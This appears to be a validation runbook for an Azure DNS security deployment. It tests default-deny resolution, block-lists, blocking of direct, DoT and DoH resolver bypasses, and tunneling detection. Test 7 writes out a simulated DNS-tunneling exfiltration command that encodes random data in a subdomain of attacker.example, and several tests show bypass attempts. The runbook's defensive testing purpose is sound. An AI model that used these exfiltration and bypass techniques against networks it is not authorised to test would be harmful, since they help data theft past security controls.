# Validation — prove the controls actually work

Run these from a VM in the **workload subnet** after `terraform apply`. Each
test asserts a specific mitigation. Do not run against domains you don't own.

## 1. Default-deny blocks arbitrary domains

```bash
# Should FAIL to resolve (not in any allow-list -> rule 400 default-deny).
nslookup random-unapproved-domain-$RANDOM.example
```
Expected: no/blocked answer. ✅ prevents exfil to arbitrary domains.

## 2. Approved domains still resolve

```bash
nslookup api.contoso.com     # allow-list -> should resolve
```

## 3. Known-bad / TI domains are blocked

```bash
nslookup malicious-exfil.example    # block-list rule 100 -> blocked
```

## 4. Bypass attempt: direct external resolver is blocked (NSG)

```bash
# Querying 8.8.8.8 directly should TIME OUT (NSG denies 53 to Internet).
nslookup example.com 8.8.8.8
dig @1.1.1.1 example.com          # should time out
```
Expected: timeout / no route. ✅ hosts cannot bypass the policy.

## 5. Bypass attempt: DoT (853) is blocked

```bash
kdig -d @1.1.1.1 +tls example.com   # should fail (NSG/firewall deny 853)
```

## 6. Bypass attempt: DoH (443) is blocked by firewall

```bash
curl -sS -H 'accept: application/dns-json' \
  'https://cloudflare-dns.com/dns-query?name=example.com&type=A'
```
Expected: connection blocked by Azure Firewall (explicit DoH deny + FQDN
allow-list). ✅ closes the HTTPS DNS tunnel.

## 7. Tunneling detection fires

```bash
# Long random label simulates data encoded in a subdomain.
nslookup $(head -c 60 /dev/urandom | base32 | tr -d '=' | tr 'A-Z' 'a-z').attacker.example
```
Then confirm the Sentinel analytics rule `dns-tunneling-long-subdomain`
produces an incident and the blocked-DNS alert emails the SOC.

## 8. Governance: tamper is detected

Disable a rule in the portal (set state to Disabled) and confirm the Azure
Policy assignment `audit-dns-rules-enabled` marks it **non-compliant**, and the
policy resource cannot be deleted due to the CanNotDelete lock.

---

> Tip: automate 1–6 in a pipeline smoke test after each deploy so a regression
> that re-opens a bypass path is caught immediately.
